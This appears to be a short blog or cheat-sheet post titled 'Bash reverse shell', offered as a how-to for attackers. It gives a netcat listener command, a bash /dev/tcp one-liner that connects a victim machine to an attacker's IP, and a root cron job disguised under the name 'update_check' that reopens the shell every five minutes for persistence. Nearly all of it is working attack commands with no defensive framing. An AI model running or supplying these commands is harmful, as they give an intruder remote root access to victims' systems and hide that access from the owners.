---
layout: post
title:  "Bash reverse shell"
categories: reverse_shell
summary: Create reverse shell with bash
---

{% include instructions.md %}

### {{page.title}}

In attacker’s computer listen 51920 port using Netcat
```shell
# nc -l -p 51920
```

Victim is connecting to attacker and opening reverse shell
```shell
# /bin/bash -i >& /dev/tcp/[attacker ip address]/51920 0>&1
```

You can also create a script that will try to open a reverse shell in every 5 minute
```shell
# nano /etc/cron.d/update_check

*/5 * * * * root /bin/bash -c '/bin/bash -i >& /dev/tcp/[attacker ip address]/51920 0>&1'
```
